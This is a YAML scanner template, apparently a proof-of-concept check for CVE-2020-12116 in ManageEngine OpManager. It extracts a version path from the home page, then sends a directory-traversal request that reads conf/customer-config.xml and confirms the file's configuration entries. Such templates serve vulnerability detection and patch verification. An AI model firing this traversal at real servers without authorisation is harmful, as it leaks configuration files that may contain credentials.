name: yaml-poc-zohocorp-manageengine_opmanager-leak-CVE-2020-12116
binding: a64e5e82-0970-43ef-803a-d8d3f204a099
detail:
    author: system_user
    links:
        - http://www.nsfocus.net/vulndb/47556
        - https://nvd.nist.gov/vuln/detail/CVE-2020-12116
        - https://www.manageengine.com/network-monitoring/help/read-me-complete.html
        - https://www.manageengine.com/network-monitoring/help/read-me-complete.html#125125
    vulnerability:
        id: 1849933c-2437-49f3-a101-dd3844876550
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200 && "SRC=\"/cachestart/".bmatches(response.body)
        output:
            search: |
                "<SCRIPT\\sLANGUAGE=\"javascript\"\\sSRC=\"/(?P<version>.*)jquery-.*\"></SCRIPT>".bsubmatch(response.body)
            version: search["version"]
    r1:
        request:
            cache: true
            method: GET
            path: /{{version}}../../../../conf/customer-config.xml
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("xml") && "\\<configuration\\sname=\".*\"\\svalue=\".*\"/\\>".bmatches(response.body)
expression: r0() && r1()
